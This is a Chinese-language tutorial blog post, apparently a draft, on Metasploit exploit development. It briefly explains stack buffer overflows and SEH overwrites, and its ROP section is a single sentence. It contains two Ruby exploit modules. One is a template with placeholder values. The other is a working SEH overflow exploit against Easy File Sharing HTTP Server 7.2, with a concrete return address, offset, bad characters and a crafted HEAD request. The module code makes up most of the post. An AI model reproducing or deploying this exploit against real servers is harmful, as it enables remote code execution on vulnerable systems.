---
title: 'metasploit渗透——三个例子'
date: 2019-01-01
category: 'kali&Linux'
tags: []
lang: 'zh'
draft: true
---
平台： Windows
工具：metasploit
## 基于缓冲区溢出的攻击

缓冲区溢出的攻击基本原理：通过覆盖掉缓冲区，将原本存在栈中的返回地址替换掉来达到控制EIP的目的

计算填充的字符：可以使用`pattern_create`来生成然后使用`pattern_offset`来计算
计算完填充的字符之后，由于我们的shellcode是布置在栈上的，很自然的需要修改EIP的数据让其指向栈中，也就是说，需要一条jump esp(jump就是跳转，会修改EIP) 然后经过一段nop指令到达我们的shellcode并开始执行，这就是栈溢出的思路。

一些函数或者命令：
`make_nops`创建参数n相同的NOP
`connect`与目标进行连接
`disconect`断开连接
`pack`将数据以小端序排列
`payload`这是需要后面设置的，相当于我们的shellcode，比如我们这里可以设置bind_tcp也就是保持连接
`handler`将连接传递给攻击载荷handler以此来检查渗透模块是否成功执行
`sock.put`传送数据
`BadChars`定义坏字符
至此一个渗透模块就讲解的差不多了
代码如下：
```ruby
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
  super(update_info(info,
    'Name' 		=> 'Stack Based Buffer Overflow Example',
    'Description' 	=> %q{
      			    Stack Based Overflow Example Application Exploitation Module
    			   },
    'Platform' 		=> 'Windows',
    'Author' 		=> 'lajiyanhan',

    'Payload' 		=>
      			   {
        		   'space' => 400,
                   'BadChars' => "\x00\xff"
                      	   },
    'Targets'  		=>
      			   [
        		     [
			      'Windows XP SP3',
			      {'Ret' => find it, 'Offset' => find it}
			     ]
      			   ],
     'DisclosureDate' => '2019-05-25'
  ))
  end

  def exploit
    connect
    buf = make_nops(target['Offset'])
    buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded
    sock.put(buf)
    handler
    disconnect
   end
end
```

## 基于SEH的攻击
突然想到一个问题：为什么这里不直接用基于缓冲区溢出的攻击呢？
因为很简单，这里有异常处理程序，没办法那么简单地就覆盖掉返回地址
所以我们就去覆盖SEH地址吧

通过PPR劫持SEH链的跳转

相关函数或指令：
`generate_seh_record`可以产生SEH记录
基本思路就是通过这个函数产生SEH记录，当然前提是我们还是需要找到一条PPR指令才行
至于为什么是PPR，不解释了

代码：
```ruby
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Easy File Sharing HTTP Server 7.2 SEH Overflow',
      'Description'     => %q{
        This Module Demonstrate SEH based overflow example
      },
      'Author'          => 'lajiyanhan',

      'Payload'         =>
        	{
          		'Space'       => 390,
          		'BadChars'    => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"
        	},
      'Platform'      => 'Windows',
      'Targets'       =>
         		 [
            		   [
              		   'Easy File Sharing 7.2 HTTP',
              			{
                		'Ret'       => 0x1000108b,
                		'Offset'    => 4061
              			}
            		   ]
          		 ],
      'DisclosureDate'  => '2019-01-16',
  ))
  end

  def exploit
    connect
    weapon = "HEAD "
    weapon << make_nops(target['Offset'])
    weapon << generate_seh_record(target['Ret'])
    weapon << make_nops(20)
    weapon << payload.encoded
    weapon << " HTTP/1.0\r\n\r\n"
    sock.put(weapon)
    handler
    disconnect
   end
end
```

## 基于ROP的攻击

ROP这个其实不难，找到就行了
